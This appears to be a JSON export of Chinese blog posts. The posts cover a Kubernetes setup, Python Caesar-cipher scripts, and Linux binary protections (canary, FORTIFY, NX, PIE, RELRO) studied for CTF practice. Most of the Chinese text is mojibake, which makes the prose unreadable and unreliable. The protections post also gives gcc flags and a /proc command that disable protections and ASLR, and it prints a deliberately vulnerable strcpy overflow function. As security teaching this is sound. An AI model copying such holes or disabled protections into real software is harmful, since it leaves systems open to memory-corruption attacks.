ä¿®æ”¹æ–‡ä»¶/etc/kubernetes/config(æ‰€æœ‰èŠ‚ç‚¹)æ³¨æ„ï¼Œmasterå’Œslaveä¸»æœºéƒ½è¦ä¿®æ”¹æŒ‡å®šmasterä¸»æœºçš„ipï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š äºŒ ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/etcd/etcd.conf,ç¡®ä¿etcdç›‘å¬æ‰€æœ‰åœ°å€ã€‚å†…å®¹å¦‚ä¸‹ ä¸‰ ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/kubernetes/apiserver å›› ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/kubernetes/controller-managerï¼Œå®šä¹‰slaveä¸»æœºipåœ°å€ åœ¨masterä¸»æœºä¸Šï¼Œå¯åŠ¨æœåŠ¡for SERVICES in etcd kube-apiserver kube-controller-manager kube-scheduler; do systemctl restart $SERVICES systemctl enable $SERVICES systemctl status $SERVICES done slaveèŠ‚ç‚¹é…ç½®yum å®‰è£…kubernetes yum -y install kubernetes flannel slave é…ç½®æ–‡ä»¶ä¿®æ”¹ä¸€ .ä¿®æ”¹kubernetesé…ç½®æ–‡ä»¶ï¼ŒæŒ‡å®šmaster/etc/kubernetes/config äºŒ é…ç½®kubeletæœåŠ¡ /etc/kubernetes/kubelet åœ¨slaveä¸»æœºä¸Šï¼Œå¯åŠ¨æœåŠ¡for SERVICES in kube-proxy kubelet docker flanneld; do systemctl restart $SERVICES systemctl enable $SERVICES systemctl status $SERVICES done ###éªŒè¯","categories":[{"name":"docker","slug":"docker","permalink":"http://yubenliu.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://yubenliu.cn/tags/docker/"},{"name":"Linux","slug":"Linux","permalink":"http://yubenliu.cn/tags/Linux/"}]},{"title":"å‡¯æ’’å¯†ç çš„åŠ å¯†è§£å¯†","slug":"kaisa","date":"2018-09-07T01:25:00.000Z","updated":"2019-11-08T10:34:43.508Z","comments":true,"path":"2018/09/07/kaisa/","link":"","permalink":"http://yubenliu.cn/2018/09/07/kaisa/","excerpt":"å‰è¨€ å‡¯æ’’å¯†ç ä½œä¸ºä¸€ç§æœ€ä¸ºå¤è€çš„å¯¹ç§°åŠ å¯†ä½“åˆ¶ï¼Œåœ¨å¤ç½—é©¬çš„æ—¶å€™éƒ½å·²ç»å¾ˆæµè¡Œï¼Œä»–çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡æŠŠå­—æ¯ç§»åŠ¨ä¸€å®šçš„ä½æ•°æ¥å®ç°åŠ å¯†å’Œè§£å¯†ã€‚æ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ã€‚ä¾‹å¦‚ï¼Œå½“åç§»é‡æ˜¯3çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å­—æ¯Aå°†è¢«æ›¿æ¢æˆDï¼ŒBå˜æˆEï¼Œä»¥æ­¤ç±»æ¨Xå°†å˜æˆAï¼ŒYå˜æˆBï¼ŒZå˜æˆCã€‚ç”±æ­¤å¯è§ï¼Œä½æ•°å°±æ˜¯å‡¯æ’’å¯†ç åŠ å¯†å’Œè§£å¯†çš„å¯†é’¥ã€‚","text":"å‰è¨€ å‡¯æ’’å¯†ç ä½œä¸ºä¸€ç§æœ€ä¸ºå¤è€çš„å¯¹ç§°åŠ å¯†ä½“åˆ¶ï¼Œåœ¨å¤ç½—é©¬çš„æ—¶å€™éƒ½å·²ç»å¾ˆæµè¡Œï¼Œä»–çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡æŠŠå­—æ¯ç§»åŠ¨ä¸€å®šçš„ä½æ•°æ¥å®ç°åŠ å¯†å’Œè§£å¯†ã€‚æ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ã€‚ä¾‹å¦‚ï¼Œå½“åç§»é‡æ˜¯3çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å­—æ¯Aå°†è¢«æ›¿æ¢æˆDï¼ŒBå˜æˆEï¼Œä»¥æ­¤ç±»æ¨Xå°†å˜æˆAï¼ŒYå˜æˆBï¼ŒZå˜æˆCã€‚ç”±æ­¤å¯è§ï¼Œä½æ•°å°±æ˜¯å‡¯æ’’å¯†ç åŠ å¯†å’Œè§£å¯†çš„å¯†é’¥ã€‚ å‡¯æ’’å¯†ç åŠ å¯†è„š äº¤å•çš„26æ¬¡åŠ å¯†è„šæœ¬ #coding:utf-8 upperDict=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'] lowerDict=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'] def cesarWithLetter(ciphertext,offset): ''' å‡¯æ’’å¯†ç  : åªè½¬æ¢å­—æ¯(åŒ…æ‹¬å¤§å†™å°å†™) å‚æ•° : ciphertext : æ˜æ–‡ offset : åç§»é‡ ''' result = \"\" for ch in ciphertext: if ch.isupper(): result=result+upperDict[((upperDict.index(ch)+offset)%26)] elif ch.islower(): result=result+lowerDict[((lowerDict.index(ch)+offset)%26)] elif ch.isdigit(): result=result+ch else: result=result+ch return result def printAllResult(ciphertext): ''' æ‰“å°æ‰€æœ‰åç§»ç»“æœ ''' for i in range(len(upperDict)): print cesarWithLetter(ciphertext,i) ciphertext=raw_input(\"Please input the words :\") printAllResult(ciphertext) è‡ªåŠ¨æ§åˆ¶åç§»ä½è‡ªåŠ¨è§£å¯† #-*-coding:utf-8-*- __author__ = 007 __date__ = 2016 / 02 / 04 #==================================================================# # å‡¯æ’’å¯†ç (caesar)æ˜¯æœ€æ—©çš„ä»£æ¢å¯†ç ,å¯¹ç§°å¯†ç çš„ä¸€ç§ # # ç®—æ³•ï¼šå°†æ¯ä¸ªå­—æ¯ç”¨å­—æ¯è¡¨ä¸­å®ƒä¹‹åçš„ç¬¬kä¸ªå­—æ¯ï¼ˆç§°ä½œä½ç§»å€¼ï¼‰æ›¿ä»£ # #==================================================================# def encryption(): str_raw = raw_input(\"è¯·è¾“å…¥æ˜æ–‡ï¼š\") k = input(\"è¯·è¾“å…¥ä½ç§»å€¼ï¼š\") str_change = str_raw.lower() str_list = list(str_change) str_list_encry = str_list i = 0 while i &lt; len(str_list): if ord(str_list[i]) &lt; 123-k: str_list_encry[i] = chr(ord(str_list[i]) + k) else: str_list_encry[i] = chr(ord(str_list[i]) + k - 26) i = i+1 print \"åŠ å¯†ç»“æœä¸ºï¼š\"+\"\".join(str_list_encry) def decryption(): str_raw = raw_input(\"è¯·è¾“å…¥å¯†æ–‡ï¼š\") k = input(\"è¯·è¾“å…¥ä½ç§»å€¼ï¼š\") str_change = str_raw.lower() str_list = list(str_change) str_list_decry = str_list i = 0 while i &lt; len(str_list): if ord(str_list[i]) >= 97+k: str_list_decry[i] = chr(ord(str_list[i]) - k) else: str_list_decry[i] = chr(ord(str_list[i]) + 26 - k) i = i+1 print \"è§£å¯†ç»“æœä¸ºï¼š\"+\"\".join(str_list_decry) while True: print u\"1. åŠ å¯†\" print u\"2. è§£å¯†\" choice = raw_input(\"è¯·é€‰æ‹©ï¼š\") if choice == \"1\": encryption() elif choice == \"2\": decryption() else: print u\"æ‚¨çš„è¾“å…¥æœ‰è¯¯ï¼\" #if __name__ == \"__main__\": # main","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"http://yubenliu.cn/categories/å¯†ç å­¦/"}],"tags":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"http://yubenliu.cn/tags/å¯†ç å­¦/"},{"name":"Python","slug":"Python","permalink":"http://yubenliu.cn/tags/Python/"}]},{"title":"linuxç¨‹åºçš„ä¿æŠ¤æœºåˆ¶","slug":"linuxç¨‹åºä¿æŠ¤æœºåˆ¶","date":"2018-07-16T08:00:41.000Z","updated":"2018-07-16T08:00:41.000Z","comments":true,"path":"2018/07/16/linuxç¨‹åºä¿æŠ¤æœºåˆ¶/","link":"","permalink":"http://yubenliu.cn/2018/07/16/linuxç¨‹åºä¿æŠ¤æœºåˆ¶/","excerpt":"æœ€è¿‘çœ‹äº†ä¸€äº›PWN çš„é¢˜ç›®ï¼Œåœ¨æ­¤æ€»ç»“ä¸€æ³¢ï¼Œè¿™ç¯‡æ–‡ç« æœ‰äº›èµ„æ–™æ¥è‡ªå„ç½‘å‹çš„æ€»ç»“ã€‚åƒæˆ‘è¿™æ ·è®°å¿†åŠ›æ¯”è¾ƒå·®çš„äººï¼Œè¿˜æ˜¯è¦å¤šè®°å½•ã€‚ æ“ä½œç³»ç»Ÿæä¾›äº†è®¸å¤šå®‰å…¨æœºåˆ¶æ¥å°è¯•é™ä½æˆ–é˜»æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å¸¦æ¥çš„å®‰å…¨é£é™©ï¼ŒåŒ…æ‹¬DEPã€ASLRç­‰ã€‚åœ¨ç¼–å†™æ¼æ´åˆ©ç”¨ä»£ç çš„æ—¶å€™ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ç›®æ ‡è¿›ç¨‹æ˜¯å¦å¼€å¯äº†DEPï¼ˆLinuxä¸‹å¯¹åº”NXï¼‰ã€ASLRï¼ˆLinuxä¸‹å¯¹åº”PIEï¼‰ç­‰æœºåˆ¶ï¼Œä¾‹å¦‚å­˜åœ¨DEPï¼ˆNXï¼‰çš„è¯å°±ä¸èƒ½ç›´æ¥æ‰§è¡Œæ ˆä¸Šçš„æ•°æ®ï¼Œå­˜åœ¨ASLRçš„è¯å„ä¸ªç³»ç»Ÿè°ƒç”¨çš„åœ°å€å°±æ˜¯éšæœºåŒ–çš„ã€‚","text":"æœ€è¿‘çœ‹äº†ä¸€äº›PWN çš„é¢˜ç›®ï¼Œåœ¨æ­¤æ€»ç»“ä¸€æ³¢ï¼Œè¿™ç¯‡æ–‡ç« æœ‰äº›èµ„æ–™æ¥è‡ªå„ç½‘å‹çš„æ€»ç»“ã€‚åƒæˆ‘è¿™æ ·è®°å¿†åŠ›æ¯”è¾ƒå·®çš„äººï¼Œè¿˜æ˜¯è¦å¤šè®°å½•ã€‚ æ“ä½œç³»ç»Ÿæä¾›äº†è®¸å¤šå®‰å…¨æœºåˆ¶æ¥å°è¯•é™ä½æˆ–é˜»æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å¸¦æ¥çš„å®‰å…¨é£é™©ï¼ŒåŒ…æ‹¬DEPã€ASLRç­‰ã€‚åœ¨ç¼–å†™æ¼æ´åˆ©ç”¨ä»£ç çš„æ—¶å€™ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ç›®æ ‡è¿›ç¨‹æ˜¯å¦å¼€å¯äº†DEPï¼ˆLinuxä¸‹å¯¹åº”NXï¼‰ã€ASLRï¼ˆLinuxä¸‹å¯¹åº”PIEï¼‰ç­‰æœºåˆ¶ï¼Œä¾‹å¦‚å­˜åœ¨DEPï¼ˆNXï¼‰çš„è¯å°±ä¸èƒ½ç›´æ¥æ‰§è¡Œæ ˆä¸Šçš„æ•°æ®ï¼Œå­˜åœ¨ASLRçš„è¯å„ä¸ªç³»ç»Ÿè°ƒç”¨çš„åœ°å€å°±æ˜¯éšæœºåŒ–çš„ã€‚ å…³äº NX PIEçš„å‚è€ƒé“¾æ¥ http://tacxingxing.com/2017/07/15/pie-alsr/ ##ä¸€ã€å…³äº checksec Checksecæ˜¯ä¸€ä¸ªbashè„šæœ¬ï¼Œç”¨äºæ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„å±æ€§ï¼ˆå¦‚PIEï¼ŒRELROï¼ŒPaXï¼ŒCanariesï¼ŒASLRï¼ŒFortify Sourceï¼‰ã€‚å®ƒæœ€åˆç”±Tobias Kleinç¼–å†™ï¼ŒåŸå§‹èµ„æ–™æ¥æº www.trapkit.de/tools/checksec.html github åœ°å€ https://github.com/slimm609/checksec.sh ä½¿ç”¨è¯´æ˜ å…·ä½“çš„ä¾‹å­ï¼ˆå¦‚æœå®‰è£…gdbè‡ªå¸¦checksecï¼‰ äºŒã€CANNARY(æ ˆä¿æŠ¤)è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºæ ˆä¿æŠ¤åŠŸèƒ½æœ‰æ²¡æœ‰å¼€å¯ã€‚æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚ gccåœ¨4.2ç‰ˆæœ¬ä¸­æ·»åŠ äº†-fstack-protectorå’Œ-fstack-protector-allç¼–è¯‘å‚æ•°ä»¥æ”¯æŒæ ˆä¿æŠ¤åŠŸèƒ½ï¼Œ4.9æ–°å¢äº†-fstack-protector-strongç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿ã€‚ å› æ­¤åœ¨ç¼–è¯‘æ—¶å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯æ ˆä¿æŠ¤ä»¥åŠç¨‹åº¦ï¼Œä¾‹å¦‚ï¼š gcc -o test test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯Canaryä¿æŠ¤ gcc -fno-stack-protector -o test test.c //ç¦ç”¨æ ˆä¿æŠ¤ gcc -fstack-protector -o test test.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç  gcc -fstack-protector-all -o test test.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç  ä¸‰ã€ FORTIFY ä»‹ç»forityå…¶å®éå¸¸è½»å¾®çš„æ£€æŸ¥ï¼Œç”¨äºæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„é”™è¯¯ã€‚é€‚ç”¨æƒ…å½¢æ˜¯ç¨‹åºé‡‡ç”¨å¤§é‡çš„å­—ç¬¦ä¸²æˆ–è€…å†…å­˜æ“ä½œå‡½æ•°ï¼Œå¦‚memcpyï¼Œmemsetï¼Œstpcpyï¼Œstrcpyï¼Œstrncpyï¼Œstrcatï¼Œstrncatï¼Œsprintfï¼Œsnprintfï¼Œvsprintfï¼Œvsnprintfï¼Œgetsä»¥åŠå®½å­—ç¬¦çš„å˜ä½“ã€‚ è¯´æ˜_FORTIFY_SOURCEè®¾ä¸º1ï¼Œå¹¶ä¸”å°†ç¼–è¯‘å™¨è®¾ç½®ä¸ºä¼˜åŒ–1(gcc -O1)ï¼Œä»¥åŠå‡ºç°ä¸Šè¿°æƒ…å½¢ï¼Œé‚£ä¹ˆç¨‹åºç¼–è¯‘æ—¶å°±ä¼šè¿›è¡Œæ£€æŸ¥ä½†åˆä¸ä¼šæ”¹å˜ç¨‹åºåŠŸèƒ½ _FORTIFY_SOURCEè®¾ä¸º2ï¼Œæœ‰äº›æ£€æŸ¥åŠŸèƒ½ä¼šåŠ å…¥ï¼Œä½†æ˜¯è¿™å¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒã€‚ gcc -D_FORTIFY_SOURCE=1 ä»…ä»…åªä¼šåœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ£€æŸ¥ (ç‰¹åˆ«åƒæŸäº›å¤´æ–‡ä»¶ #include ) gcc -D_FORTIFY_SOURCE=2 ç¨‹åºæ‰§è¡Œæ—¶ä¹Ÿä¼šæœ‰æ£€æŸ¥ (å¦‚æœæ£€æŸ¥åˆ°ç¼“å†²åŒºæº¢å‡ºï¼Œå°±ç»ˆæ­¢ç¨‹åº) ä¸¾ä¸ªä¾‹å­å¯èƒ½ç®€å•æ˜äº†ä¸€äº›ï¼šä¸€æ®µç®€å•çš„å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„Cä»£ç  void fun(char *s) { char buf[0x100]; strcpy(buf, s); /* Don&#39;t allow gcc to optimise away the buf */ asm volatile(&quot;&quot; :: &quot;m&quot; (buf)); } ç”¨åŒ…å«å‚æ•°-U_FORTIFY_SOURCEç¼–è¯‘ 08048450 &lt;fun&gt;: push %ebp ; mov %esp,%ebp sub $0x118,%esp ; å°†0x118å­˜å‚¨åˆ°æ ˆä¸Š mov 0x8(%ebp),%eax ; å°†ç›®æ ‡å‚æ•°è½½å…¥eax mov %eax,0x4(%esp) ; ä¿å­˜ç›®æ ‡å‚æ•° lea -0x108(%ebp),%eax ; æ•°ç»„buf mov %eax,(%esp) ; ä¿å­˜ call 8048320 &lt;strcpy@plt&gt; leave ; ret ç”¨åŒ…å«å‚æ•°-D_FORTIFY_SOURCE=2ç¼–è¯‘ 08048470 &lt;fun&gt;: push %ebp ; mov %esp,%ebp sub $0x118,%esp ; movl $0x100,0x8(%esp) ; æŠŠ0x100å½“ä½œç›®æ ‡å‚æ•°ä¿å­˜ mov 0x8(%ebp),%eax ; mov %eax,0x4(%esp) ; lea -0x108(%ebp),%eax ; mov %eax,(%esp) ; call 8048370 &lt;__strcpy_chk@plt&gt; leave ; ret æˆ‘ä»¬å¯ä»¥çœ‹åˆ°gccç”Ÿæˆäº†ä¸€äº›é™„åŠ ä»£ç ï¼Œé€šè¿‡å¯¹æ•°ç»„å¤§å°çš„åˆ¤æ–­æ›¿æ¢strcpy, memcpy, memsetç­‰å‡½æ•°åï¼Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨ã€‚ æ€»ç»“ä¸‹å°±æœ‰: gcc -o test test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ä¼šå¼€è¿™ä¸ªæ£€æŸ¥ gcc -D_FORTIFY_SOURCE=1 -o test test.c // è¾ƒå¼±çš„æ£€æŸ¥ gcc -D_FORTIFY_SOURCE=2 -o test test.c // è¾ƒå¼ºçš„æ£€æŸ¥ å››ã€NXï¼ˆDEPï¼‰(æ•°æ®æ‰§è¡Œä¿æŠ¤ Data Execution Prevention)NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚ å·¥ä½œæµç¨‹ gccç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº†NXé€‰é¡¹ï¼Œå¦‚æœéœ€è¦å…³é—­NXé€‰é¡¹ï¼Œå¯ä»¥ç»™gccç¼–è¯‘å™¨æ·»åŠ -z execstackå‚æ•°ã€‚ä¾‹å¦‚ï¼š gcc -o test test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼€å¯NXä¿æŠ¤ gcc -z execstack -o test test.c // ç¦ç”¨NXä¿æŠ¤ gcc -z noexecstack -o test test.c // å¼€å¯NXä¿æŠ¤ å‚è€ƒä»‹ç»æ–‡ç«  depåŸç†åŠçªç ´æ–¹æ³• [1]:https://blog.csdn.net/zy_strive_2012/article/details/9119153 äº”ã€PIEï¼ˆASLRï¼‰ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°å…¶ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚ å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶ï¼ˆaddress space layout randomization)ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µ 0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚ 1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚ 2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚ å¯ä»¥é˜²èŒƒåŸºäºRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚ Built as PIEï¼šä½ç½®ç‹¬ç«‹çš„å¯æ‰§è¡ŒåŒºåŸŸï¼ˆposition-independent executablesï¼‰ã€‚è¿™æ ·ä½¿å¾—åœ¨åˆ©ç”¨ç¼“å†²æº¢å‡ºå’Œç§»åŠ¨æ“ä½œç³»ç»Ÿä¸­å­˜åœ¨çš„å…¶ä»–å†…å­˜å´©æºƒç¼ºé™·æ—¶é‡‡ç”¨é¢å‘è¿”å›çš„ç¼–ç¨‹ï¼ˆreturn-oriented programmingï¼‰æ–¹æ³•å˜å¾—éš¾å¾—å¤šã€‚ liunxä¸‹å…³é—­PIEçš„å‘½ä»¤å¦‚ä¸‹ï¼š sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space -gcc ç¼–è¯‘å‘½ä»¤ gcc -o test test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIE gcc -fpie -pie -o test test.c // å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1 gcc -fPIE -pie -o test test.c // å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2 gcc -fpic -o test test.c // å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIE gcc -fPIC -o test test.c // å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE è¯´æ˜ PIEæœ€æ—©ç”±RedHatçš„äººå®ç°ï¼Œä»–åœ¨è¿æ¥èµ·ä¸Šå¢åŠ äº†-pieé€‰é¡¹ï¼Œè¿™æ ·ä½¿ç”¨-fPIEç¼–è¯‘çš„å¯¹è±¡å°±èƒ½é€šè¿‡è¿æ¥å™¨å¾—åˆ°ä½ç½®æ— å…³å¯æ‰§è¡Œç¨‹åºã€‚fPIEå’ŒfPICæœ‰äº›ä¸åŒã€‚å¯ä»¥å‚è€ƒGccå’ŒOpen64ä¸­çš„-fPICé€‰é¡¹. gccä¸­çš„-fpicé€‰é¡¹ï¼Œä½¿ç”¨äºåœ¨ç›®æ ‡æœºæ”¯æŒæ—¶ï¼Œç¼–è¯‘å…±äº«åº“æ—¶ä½¿ç”¨ã€‚ç¼–è¯‘å‡ºçš„ä»£ç å°†é€šè¿‡å…¨å±€åç§»è¡¨(Global OffsetTable)ä¸­çš„å¸¸æ•°åœ°å€è®¿å­˜ï¼ŒåŠ¨æ€è£…è½½å™¨å°†åœ¨ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶è§£æGOTè¡¨é¡¹(æ³¨æ„ï¼ŒåŠ¨æ€è£…è½½å™¨æ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œè¿æ¥å™¨æ˜¯GCCçš„ä¸€éƒ¨åˆ†)ã€‚è€Œgccä¸­çš„-fPICé€‰é¡¹åˆ™æ˜¯é’ˆå¯¹æŸäº›ç‰¹æ®Šæœºå‹åšäº†ç‰¹æ®Šå¤„ç†ï¼Œæ¯”å¦‚é€‚åˆåŠ¨æ€é“¾æ¥å¹¶èƒ½é¿å…è¶…å‡ºGOTå¤§å°é™åˆ¶ä¹‹ç±»çš„é”™è¯¯ã€‚è€ŒOpen64ä»…ä»…æ”¯æŒä¸ä¼šå¯¼è‡´GOTè¡¨æº¢å‡ºçš„PICç¼–è¯‘ã€‚ gccä¸­çš„-fpieå’Œ-fPIEé€‰é¡¹å’ŒfpicåŠfPICå¾ˆç›¸ä¼¼ï¼Œä½†ä¸åŒçš„æ˜¯ï¼Œé™¤äº†ç”Ÿæˆä¸ºä½ç½®æ— å…³ä»£ç å¤–ï¼Œè¿˜èƒ½å‡å®šä»£ç æ˜¯å±äºæœ¬ç¨‹åºã€‚é€šå¸¸è¿™äº›é€‰é¡¹ä¼šå’ŒGCCé“¾æ¥æ—¶çš„-pieé€‰é¡¹ä¸€èµ·ä½¿ç”¨ã€‚fPIEé€‰é¡¹ä»…èƒ½åœ¨ç¼–è¯‘å¯æ‰§è¡Œç æ—¶ç”¨ï¼Œä¸èƒ½ç”¨äºç¼–è¯‘åº“ã€‚æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¦PIEçš„ç¨‹åºï¼Œéœ€è¦ä½ é™¤äº†åœ¨gccå¢åŠ -fPIEé€‰é¡¹å¤–ï¼Œè¿˜éœ€è¦åœ¨ldæ—¶å¢åŠ -pieé€‰é¡¹æ‰èƒ½äº§ç”Ÿè¿™ç§ä»£ç ã€‚å³gcc -fpie -pieæ¥ç¼–è¯‘ç¨‹åºã€‚å•ç‹¬ä½¿ç”¨å“ªä¸€ä¸ªéƒ½æ— æ³•è¾¾åˆ°æ•ˆæœã€‚ å…­ã€RELROåœ¨Linuxç³»ç»Ÿå®‰å…¨é¢†åŸŸæ•°æ®å¯ä»¥å†™çš„å­˜å‚¨åŒºå°±ä¼šæ˜¯æ”»å‡»çš„ç›®æ ‡ï¼Œå°¤å…¶æ˜¯å­˜å‚¨å‡½æ•°æŒ‡é’ˆçš„åŒºåŸŸã€‚ æ‰€ä»¥åœ¨å®‰å…¨é˜²æŠ¤çš„è§’åº¦æ¥è¯´å°½é‡å‡å°‘å¯å†™çš„å­˜å‚¨åŒºåŸŸå¯¹å®‰å…¨ä¼šæœ‰æå¤§çš„å¥½å¤„. GCC, GNU linkerä»¥åŠGlibc-dynamic linkerä¸€èµ·é…åˆå®ç°äº†ä¸€ç§å«åšrelroçš„æŠ€æœ¯: read only relocationã€‚å¤§æ¦‚å®ç°å°±æ˜¯ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯». è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚RELROä¸ºâ€ Partial RELROâ€ï¼Œè¯´æ˜æˆ‘ä»¬å¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚ gccç¼–è¯‘ï¼š gcc -o test test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELRO gcc -z norelro -o test test.c // å…³é—­ï¼Œå³No RELRO gcc -z lazy -o test test.c // éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELRO gcc -z now -o test test.c // å…¨éƒ¨å¼€å¯ï¼Œå³ ä¸ƒã€æ€»ç»“1. NXï¼š-z execstack / -z noexecstack (å…³é—­ / å¼€å¯) 2. Canaryï¼š-fno-stack-protector /-fstack-protector / -fstack-protector-all (å…³é—­ / å¼€å¯ / å…¨å¼€å¯) 3. PIEï¼š-no-pie / -pie (å…³é—­ / å¼€å¯) 4. RELROï¼š-z norelro / -z lazy / -z now 